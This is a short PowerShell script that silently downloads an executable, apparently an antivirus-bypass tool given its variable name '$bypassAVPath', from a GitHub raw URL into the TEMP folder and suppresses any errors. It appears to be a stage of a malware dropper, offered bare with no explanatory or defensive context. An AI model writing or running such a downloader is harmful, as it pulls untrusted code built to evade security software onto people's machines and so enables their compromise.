$bypassAVPath = "$env:TEMP\saa.exe"
try {
    (New-Object Net.WebClient).DownloadFile("https://github.com/momika233/test0916/raw/refs/heads/main/saa.exe", $bypassAVPath)
    if (Test-Path $bypassAVPath) {
        $bypassAVPath
    }
}
catch {
    #error
}
